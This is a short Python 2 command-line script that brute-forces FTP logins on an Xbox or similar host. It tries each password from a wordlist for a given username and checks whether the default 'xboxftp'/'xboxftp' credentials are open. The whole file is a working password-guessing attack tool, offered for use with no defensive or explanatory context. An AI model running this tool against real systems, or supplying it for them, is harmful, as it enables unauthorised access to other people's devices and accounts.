#!/usr/bin/env python
# -*- coding:utf-8 -*-

__author__ = 'Daniel Godoy'

import argparse
import sys
from ftplib import FTP

info = '''
Usage: ./xbox_ftp_brute_forcer.py [options]\n
Options: -t, --target    <hostname/ip>   |   Target\n
         -u, --user      <user>          |   User\n
         -w, --wordlist  <filename>      |   Wordlist\n
         -h, --help      <help>          |   print help\n

Example: ./xbox_brute_forcer.py -t 192.168.1.1 -u root -w /root/Desktop/wordlist.txt
'''


def help():
    print info
    sys.exit(0)


def check_default_login(target):
    try:
        ftp = FTP(target)
        ftp.login('xboxftp', 'xboxftp')
        ftp.quit()
        print "\n[+] Default login is open."
        print "\n[+] Username : xboxftp"
        print "\n[+] Password : xboxftp\n"
        ftp.quit()
    except:
        pass


def ftp_login(target, username, password):
    try:
        ftp = FTP(target)
        ftp.login(username, password)
        ftp.quit()
        print "\n[*] Credentials have found."
        print "\n[*] Username : {}".format(username)
        print "\n[*] Password : {}".format(password)
        return True
    except:
        return False


def brute_force(target, username, wordlist):
    try:
        wordlist = open(wordlist, "r")
        words = wordlist.readlines()
        for word in words:
            word = word.strip()
            if ftp_login(target, username, word):
                break
    except:
        print "\n[-] There is no such wordlist file. \n"
        sys.exit(0)



parser = argparse.ArgumentParser()
parser.add_argument("-t", "--target")
parser.add_argument("-u", "--username")
parser.add_argument("-w", "--wordlist")

args = parser.parse_args()

if not args.target or not args.username or not args.wordlist:
    help()
    sys.exit(0)

target = args.target
username = args.username
wordlist = args.wordlist

brute_force(target, username, wordlist)
check_default_login(target)
print "\n[-] Brute force finished. \n"